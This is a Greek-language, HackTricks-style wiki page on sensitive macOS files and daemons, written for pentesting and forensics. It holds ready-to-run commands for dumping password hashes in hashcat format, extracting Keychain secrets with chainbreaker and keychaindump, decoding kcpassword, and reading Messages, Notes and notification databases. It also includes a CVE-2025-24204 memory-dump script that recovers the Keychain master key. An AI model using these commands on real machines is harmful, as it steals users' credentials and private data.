# Ευαίσθητες τοποθεσίες και ενδιαφέροντες daemons του macOS

{{#include ../../../banners/hacktricks-training.md}}


## Κωδικοί πρόσβασης

### Shadow Passwords

Ο shadow password αποθηκεύεται μαζί με τις ρυθμίσεις του χρήστη σε plists που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το παρακάτω oneliner μπορεί να χρησιμοποιηθεί για να κάνει dump **όλων των πληροφοριών σχετικά με τους χρήστες** (συμπεριλαμβανομένων των πληροφοριών hash):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Scripts όπως αυτό**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για τη μετατροπή του hash σε **μορφή** **hashcat**.

Μια εναλλακτική εντολή μίας γραμμής που θα εξαγάγει τα διαπιστευτήρια όλων των λογαριασμών που δεν είναι service σε μορφή hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Ένας ακόμη τρόπος για να αποκτήσετε το `ShadowHashData` ενός χρήστη είναι να χρησιμοποιήσετε το `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Μετατροπή του αντιγραμμένου ShadowHashData σε Linux

Αν το attribute αντιγράφηκε σε Linux host για cracking, αποθηκεύστε **μόνο τα δεκαεξαδικά bytes** του (όχι την ετικέτα `ShadowHashData:`) στο `shadowhash.hex`. Στο Ubuntu, το `libplist-utils` μετατρέπει το αποκωδικοποιημένο binary plist σε αναγνώσιμο XML χωρίς το `plutil` του macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Στο XML, χρησιμοποιήστε τα `iterations` και τα base64 `salt` και `entropy` από το **`SALTED-SHA512-PBKDF2`**, όχι το ξεχωριστό SRP verifier. Ορίστε τα `salt_b64` και `entropy_b64` στα αντίστοιχα περιεχόμενα των XML `<data>`. Αποκωδικοποιήστε τα σε hex και σχηματίστε μία γραμμή ως `$ml$<iterations>$<salt_hex>$<entropy_hex>` για το Hashcat mode `7100`. Πρόκειται για offline guessing μετά από προνομιακή απόκτηση hash, όχι για μέθοδο initial access ή privilege escalation.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Αυτό το αρχείο **χρησιμοποιείται μόνο** όταν το σύστημα εκτελείται σε **λειτουργία ενός χρήστη** (άρα όχι πολύ συχνά).

### Keychain Dump

Σημειώστε ότι όταν χρησιμοποιείτε το binary `security` για να **αποκρυπτογραφήσετε και να κάνετε dump των κωδικών πρόσβασης**, θα εμφανιστούν αρκετά μηνύματα που ζητούν από τον χρήστη να επιτρέψει αυτήν τη λειτουργία.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Σε σύγχρονες εκδόσεις του macOS, τα πιο ενδιαφέροντα backing stores είναι συνήθως τα **`~/Library/Keychains/login.keychain-db`** και **`/Library/Keychains/System.keychain`**. Πρόκειται για αρχεία που βασίζονται σε SQLite, αλλά η πρόσβαση σε plaintext εξακολουθεί να διαμεσολαβείται από το **`securityd`**: η κλοπή του ακατέργαστου DB σού δίνει κυρίως metadata και κρυπτογραφημένα blobs, εκτός αν ανακτήσεις επίσης τον κωδικό πρόσβασης του χρήστη, το `SystemKey` ή ένα master key που βρίσκεται στη μνήμη.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Σύμφωνα με αυτό το σχόλιο [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), φαίνεται ότι αυτά τα εργαλεία δεν λειτουργούν πλέον στο Big Sur.

### Επισκόπηση του Keychaindump

Έχει αναπτυχθεί ένα εργαλείο με το όνομα **keychaindump** για την εξαγωγή κωδικών πρόσβασης από macOS keychains, αλλά έχει περιορισμούς σε νεότερες εκδόσεις του macOS, όπως το Big Sur, όπως αναφέρεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Για τη χρήση του **keychaindump**, ο attacker πρέπει να αποκτήσει πρόσβαση και να κλιμακώσει τα προνόμιά του σε **root**. Το εργαλείο εκμεταλλεύεται το γεγονός ότι το keychain ξεκλειδώνεται από προεπιλογή κατά τη σύνδεση του χρήστη, για λόγους ευκολίας, επιτρέποντας στις εφαρμογές να έχουν πρόσβαση σε αυτό χωρίς να ζητούν επανειλημμένα τον κωδικό πρόσβασης του χρήστη. Ωστόσο, αν ο χρήστης επιλέξει να κλειδώνει το keychain μετά από κάθε χρήση, το **keychaindump** καθίσταται αναποτελεσματικό.

Το **Keychaindump** στοχεύει μια συγκεκριμένη διεργασία που ονομάζεται **securityd**, την οποία η Apple περιγράφει ως daemon για λειτουργίες εξουσιοδότησης και κρυπτογράφησης, απαραίτητη για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει τον εντοπισμό ενός **Master Key** που προκύπτει από τον κωδικό σύνδεσης του χρήστη. Αυτό το κλειδί είναι απαραίτητο για την ανάγνωση του αρχείου keychain. Για τον εντοπισμό του **Master Key**, το **keychaindump** σαρώνει το memory heap του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά κλειδιά σε περιοχές με την ένδειξη `MALLOC_TINY`. Για την επιθεώρηση αυτών των θέσεων μνήμης χρησιμοποιείται η ακόλουθη εντολή:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Αφού εντοπίσει πιθανά master keys, το **keychaindump** αναζητά στους heaps ένα συγκεκριμένο μοτίβο (`0x0000000000000018`) που υποδεικνύει έναν υποψήφιο για master key. Απαιτούνται περαιτέρω βήματα, συμπεριλαμβανομένου του deobfuscation, για να αξιοποιηθεί αυτό το key, όπως περιγράφεται στον πηγαίο κώδικα του **keychaindump**. Οι αναλυτές που εστιάζουν σε αυτόν τον τομέα πρέπει να γνωρίζουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται στη μνήμη της διεργασίας **securityd**. Ένα παράδειγμα εντολής για την εκτέλεση του **keychaindump** είναι:

```bash
sudo ./keychaindump
```

### chainbreaker

Το [**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να εξαγάγει τους ακόλουθους τύπους πληροφοριών από μια κλειδοθήκη macOS με εγκληματολογικά ορθό τρόπο:

- Κατακερματισμένο συνθηματικό κλειδοθήκης, κατάλληλο για cracking με [hashcat](https://hashcat.net/hashcat/) ή [John the Ripper](https://www.openwall.com/john/)
- Συνθηματικά Internet
- Γενικά συνθηματικά
- Ιδιωτικά κλειδιά
- Δημόσια κλειδιά
- Πιστοποιητικά X509
- Ασφαλείς σημειώσεις
- Συνθηματικά AppleShare

Με το συνθηματικό ξεκλειδώματος της κλειδοθήκης, ένα master key που αποκτήθηκε με το [volafox](https://github.com/n0fate/volafox) ή το [volatility](https://github.com/volatilityfoundation/volatility), ή ένα αρχείο ξεκλειδώματος όπως το SystemKey, το Chainbreaker παρέχει επίσης συνθηματικά σε απλό κείμενο.

Χωρίς μία από αυτές τις μεθόδους ξεκλειδώματος της κλειδοθήκης, το Chainbreaker εμφανίζει όλες τις υπόλοιπες διαθέσιμες πληροφορίες.

#### **Dump κλειδιών κλειδοθήκης**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump κλειδιών keychain (με κωδικούς πρόσβασης) με το SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump κλειδιών keychain (με κωδικούς πρόσβασης) και cracking του hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump κλειδιών keychain (με κωδικούς πρόσβασης) με memory dump**

[Ακολουθήστε αυτά τα βήματα](../index.html#dumping-memory-with-osxpmem) για να πραγματοποιήσετε ένα **memory dump**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (με passwords) χρησιμοποιώντας το password του χρήστη**

Αν γνωρίζετε το password του χρήστη, μπορείτε να το χρησιμοποιήσετε για να κάνετε **dump** και decrypt τα keychains του.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain master key μέσω του `gcore` entitlement (CVE-2025-24204)

Το macOS 15.0 (Sequoia) κυκλοφόρησε με το `/usr/bin/gcore` και το entitlement **`com.apple.system-task-ports.read`**, επιτρέποντας σε οποιονδήποτε τοπικό διαχειριστή (ή κακόβουλη υπογεγραμμένη εφαρμογή) να κάνει dump τη μνήμη οποιασδήποτε διεργασίας, ακόμη και με ενεργοποιημένα τα SIP/TCC. Το dump του `securityd` αποκαλύπτει το **Keychain master key** σε καθαρό κείμενο και επιτρέπει την αποκρυπτογράφηση του `login.keychain-db` χωρίς τον κωδικό πρόσβασης του χρήστη.<sup>[[1]](#references)</sup>

**Γρήγορο repro σε ευάλωτες εκδόσεις (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Τροφοδοτήστε το Chainbreaker με το hex key που εξαγάγατε (`--key <hex>`) για να αποκρυπτογραφήσετε το login keychain. Η Apple αφαίρεσε το entitlement στο **macOS 15.3+**, επομένως αυτό λειτουργεί μόνο σε μη ενημερωμένα builds του Sequoia ή σε συστήματα που διατήρησαν το ευάλωτο binary.

### kcpassword

Το αρχείο **kcpassword** περιέχει τον **κωδικό πρόσβασης σύνδεσης του χρήστη**, αλλά μόνο αν ο κάτοχος του συστήματος έχει **ενεργοποιήσει την αυτόματη σύνδεση**. Επομένως, ο χρήστης θα συνδέεται αυτόματα χωρίς να του ζητείται κωδικός πρόσβασης (κάτι που δεν είναι ιδιαίτερα ασφαλές).

Ο κωδικός πρόσβασης αποθηκεύεται στο αρχείο **`/etc/kcpassword`**, με XOR χρησιμοποιώντας το κλειδί **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Αν ο κωδικός πρόσβασης του χρήστη είναι μεγαλύτερος από το κλειδί, το κλειδί επαναχρησιμοποιείται.\
Έτσι, ο κωδικός πρόσβασης ανακτάται αρκετά εύκολα, για παράδειγμα με scripts όπως [**αυτό εδώ**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ενδιαφέρουσες πληροφορίες σε βάσεις δεδομένων

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Ειδοποιήσεις

Πριν από το **Sequoia**, μπορείτε συνήθως να βρείτε τη βάση δεδομένων του Notification Center στη διαδρομή **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Στο **Sequoia+**, η Apple τη μετέφερε στο TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Οι περισσότερες ενδιαφέρουσες πληροφορίες αποθηκεύονται σε στήλες **blob**, επομένως θα χρειαστεί να εξαγάγετε αυτό το περιεχόμενο και να το μετατρέψετε σε αναγνώσιμη μορφή (`plutil -p -`, `strings` ή έναν μικρό parser). Παραδείγματα γρήγορου triage:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Πρόσφατα ζητήματα απορρήτου (NotificationCenter DB)

- Στο macOS **14.7–15.1**, η Apple αποθήκευε το περιεχόμενο των banner στη βάση SQLite `db2/db` χωρίς κατάλληλη απόκρυψη. Τα CVE **CVE-2024-44292/44293/40838/54504** επέτρεπαν σε οποιονδήποτε τοπικό χρήστη να διαβάζει το κείμενο ειδοποιήσεων άλλων χρηστών, απλώς ανοίγοντας τη βάση δεδομένων (χωρίς προτροπή TCC).<sup>[[3]](#references)</sup>
- Η Apple περιόρισε αυτό το ζήτημα μεταφέροντας τη βάση δεδομένων στο `group.com.apple.usernoted` και προστατεύοντάς την με TCC σε νεότερες εκδόσεις του Sequoia. Έτσι, στα τρέχοντα συστήματα συνήθως χρειάζεστε το κατάλληλο περιβάλλον χρήστη ή ένα TCC bypass για να τη διαβάσετε.<sup>[[4]](#references)</sup>
- Σε παλαιότερα συστήματα, αντιγράψτε μαζί τα αρχεία `db`, `db-wal` και `db-shm` πριν από την ενημέρωση ή την επανεκκίνηση, αν θέλετε να διατηρήσετε τα τεχνικά ευρήματα.

### Σημειώσεις

Οι **σημειώσεις** των χρηστών βρίσκονται στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Αν το παραπάνω one-liner είναι υπερβολικά θορυβώδες, εξήγαγε το `ZICNOTEDATA.ZDATA`, αποσυμπίεσέ το με gunzip και κάνε parse το protobuf: αυτό είναι συνήθως πιο αξιόπιστο από την απευθείας εκτέλεση του `strings` στο SQLite.

### Εργασίες παρασκηνίου / Στοιχεία σύνδεσης

Από το **Ventura**, τα στοιχεία σύνδεσης που εγκρίνονται από τον χρήστη και αρκετές εργασίες παρασκηνίου καταγράφονται σε stores του **BTM**, όπως το **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** και η versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Αυτά τα αρχεία είναι χρήσιμα για τον γρήγορο εντοπισμό persistence, helper tools και ορισμένων στοιχείων παρασκηνίου που διαχειρίζεται το MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Για την πλευρά της persistence και τα εσωτερικά του BTM, δείτε [τη σελίδα με τις τοποθεσίες αυτόματης εκκίνησης](../../macos-auto-start-locations.md#login-items) και [τις σημειώσεις για το Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Προτιμήσεις

Στις εφαρμογές macOS, οι προτιμήσεις βρίσκονται στο **`$HOME/Library/Preferences`**, ενώ στο iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Στο macOS, το εργαλείο γραμμής εντολών **`defaults`** μπορεί να χρησιμοποιηθεί για την **τροποποίηση του αρχείου Preferences**.

Το **`/usr/sbin/cfprefsd`** παρέχει τις υπηρεσίες XPC `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για την εκτέλεση ενεργειών, όπως η τροποποίηση προτιμήσεων.

## Δικαιώματα OpenDirectory permissions.plist

Το αρχείο `/System/Library/OpenDirectory/permissions.plist` περιέχει δικαιώματα που εφαρμόζονται στα χαρακτηριστικά των κόμβων και προστατεύεται από το SIP.\
Αυτό το αρχείο εκχωρεί δικαιώματα σε συγκεκριμένους χρήστες βάσει UUID (και όχι uid), ώστε να μπορούν να έχουν πρόσβαση σε συγκεκριμένες ευαίσθητες πληροφορίες, όπως `ShadowHashData`, `HeimdalSRPKey` και `KerberosKeys`, μεταξύ άλλων:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Ειδοποιήσεις συστήματος

### Ειδοποιήσεις Darwin

Ο κύριος δαίμονας για τις ειδοποιήσεις είναι ο **`/usr/sbin/notifyd`**. Για να λαμβάνουν ειδοποιήσεις, οι clients πρέπει να εγγραφούν μέσω της θύρας Mach `com.apple.system.notification_center` (ελέγξτε τους με `sudo lsmp -p <pid notifyd>`). Ο δαίμονας ρυθμίζεται μέσω του αρχείου `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις ειδοποιήσεις είναι μοναδικά ονόματα σε μορφή αντίστροφου DNS. Όταν αποστέλλεται μια ειδοποίηση σε ένα από αυτά, θα τη λάβουν οι client(s) που έχουν δηλώσει ότι μπορούν να τη διαχειριστούν.

Μπορείτε να εξαγάγετε την τρέχουσα κατάσταση (και να δείτε όλα τα ονόματα) στέλνοντας το σήμα SIGUSR2 στη διεργασία notifyd και διαβάζοντας το αρχείο που δημιουργείται: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

Το **Distributed Notification Center**, του οποίου το κύριο binary είναι το **`/usr/sbin/distnoted`**, είναι ένας ακόμη τρόπος αποστολής ειδοποιήσεων. Εκθέτει ορισμένες υπηρεσίες XPC και εκτελεί κάποιους ελέγχους για να προσπαθήσει να επαληθεύσει τους clients.

### Apple Push Notifications (APN)

Σε αυτή την περίπτωση, οι εφαρμογές μπορούν να εγγραφούν σε **topics**. Ο client δημιουργεί ένα token επικοινωνώντας με τους servers της Apple μέσω του **`apsd`**.\
Στη συνέχεια, οι providers θα έχουν επίσης δημιουργήσει ένα token και θα μπορούν να συνδεθούν με τους servers της Apple για να στέλνουν μηνύματα στους clients. Αυτά τα μηνύματα θα λαμβάνονται τοπικά από το **`apsd`**, το οποίο θα προωθεί την ειδοποίηση στην εφαρμογή που την περιμένει.

Οι προτιμήσεις βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια τοπική βάση δεδομένων μηνυμάτων στο macOS, στη θέση `/Library/Application\ Support/ApplePushService/aps.db`, και στο iOS, στη θέση `/var/mobile/Library/ApplePushService`. Περιέχει 3 πίνακες: `incoming_messages`, `outgoing_messages` και `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Μπορείτε επίσης να λάβετε πληροφορίες για τον daemon και τις συνδέσεις χρησιμοποιώντας:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Ειδοποιήσεις χρήστη

Αυτές είναι ειδοποιήσεις που ο χρήστης θα πρέπει να βλέπει στην οθόνη:

- **`CFUserNotification`**: Αυτά τα API παρέχουν έναν τρόπο εμφάνισης ενός αναδυόμενου παραθύρου με μήνυμα στην οθόνη.
- **The Bulletin Board**: Εμφανίζει στο iOS ένα banner που εξαφανίζεται και αποθηκεύεται στο Notification Center.
- **`NSUserNotificationCenter`**: Η παλαιότερη υπηρεσία notification-center στο macOS. Σε παλαιότερες εκδόσεις, η βάση δεδομένων βρίσκεται συνήθως στο `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`· από το Sequoia και μετά, μεταφέρθηκε στο `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – Το entitlement gcore του macOS επέτρεπε την εξαγωγή του κύριου κλειδιού του Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Προστασία δεδομένων Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Αποκάλυψη δεδομένων SQLite του Notification Center (CVE-2024-44292 κ.ά.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Η Apple αντιμετωπίζει τις ανησυχίες περί απορρήτου σχετικά με τη βάση δεδομένων του Notification Center στο macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Ανάκτηση κωδικών πρόσβασης macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Παραδείγματα hash του Hashcat – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
